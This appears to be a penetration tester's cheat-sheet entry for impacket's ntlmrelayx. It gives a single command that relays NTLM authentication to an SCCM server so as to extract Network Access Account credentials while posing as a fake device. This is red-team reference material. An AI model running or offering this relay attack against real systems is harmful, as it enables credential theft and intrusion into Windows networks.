# ntlmrelayx (imp)

% impacket-mitm, windows, smb, 445, sccm

#plateform/linux  #target/remote #cat/ATTACK/RELAY


## sccm (NAA extraction)
#plateform/linux #target/serve #cat/ATTACK/MITM 
```
sudo ntlmrelayx.py -t http://<sccm_fqdn>/ccm_system_windowsauth/request --sccm --sccm-device <fake_computer|jubeaz> --sccm-fqdn <sccm_fqdn> --sccm-server <sccm_name> --sccm-sleep 10 -smb2support
```